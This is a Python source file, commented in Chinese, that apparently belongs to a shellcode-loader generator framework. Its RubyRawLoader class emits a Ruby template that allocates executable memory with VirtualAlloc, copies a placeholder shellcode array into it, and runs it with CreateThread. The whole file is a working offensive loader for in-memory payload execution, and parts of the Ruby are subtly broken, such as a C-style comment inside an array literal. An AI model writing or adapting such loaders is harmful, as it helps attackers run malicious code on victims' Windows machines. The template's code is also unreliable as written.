#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ruby原始加载器模块：单一职责 - 仅实现Ruby原始加载器生成，遵循BaseLoader接口
"""
from core.loader.base_loader import BaseLoader

class RubyRawLoader(BaseLoader):
    """Ruby原始加载器：单一职责 - 仅生成Ruby原始加载器（无解密）"""
    @property
    def lang_name(self) -> str:
        return "Ruby"
    
    def generate_raw(self, shellcode_len: int) -> str:
        """生成Ruby原始加载器内容"""
        return f"""require 'win32/api'

# 定义Windows API常量
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
INFINITE = 0xFFFFFFFF

# 加载Windows API函数
virtual_alloc = Win32::API.new('kernel32', 'VirtualAlloc', 'LPLL', 'L')
rtl_move_memory = Win32::API.new('kernel32', 'RtlMoveMemory', 'LLL', 'V')
create_thread = Win32::API.new('kernel32', 'CreateThread', 'LPLLPL', 'L')
wait_for_single_object = Win32::API.new('kernel32', 'WaitForSingleObject', 'LL', 'L')
virtual_free = Win32::API.new('kernel32', 'VirtualFree', 'LLL', 'B')
close_handle = Win32::API.new('kernel32', 'CloseHandle', 'L', 'B')

def main
    # 占位符：替换为你的格式化后的shellcode
    shellcode = [/* 此处填入字节数组格式shellcode */]
    shellcode_len = {shellcode_len}

    # 分配可执行内存
    mem = virtual_alloc.call(nil, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if mem == 0
        puts "VirtualAlloc failed"
        return
    end

    # 复制shellcode到内存
    shellcode_ptr = shellcode.pack('C*').pointer
    rtl_move_memory.call(mem, shellcode_ptr, shellcode_len)

    # 创建线程执行shellcode
    h_thread = create_thread.call(nil, 0, mem, nil, 0, nil)
    if h_thread == 0
        puts "CreateThread failed"
        virtual_free.call(mem, 0, 0x8000) # MEM_RELEASE
        return
    end

    # 等待线程执行完成
    wait_for_single_object.call(h_thread, INFINITE)

    # 清理资源
    close_handle.call(h_thread)
    virtual_free.call(mem, 0, 0x8000)
end

# 执行主函数
begin
    main
rescue => e
    puts "Error: #{e.message}"
end
"""
    
    def generate_decrypt(self, shellcode_len: int, encryption_history):
        """（原始加载器无需实现解密，抛出异常）"""
        raise NotImplementedError("原始加载器不支持解密功能")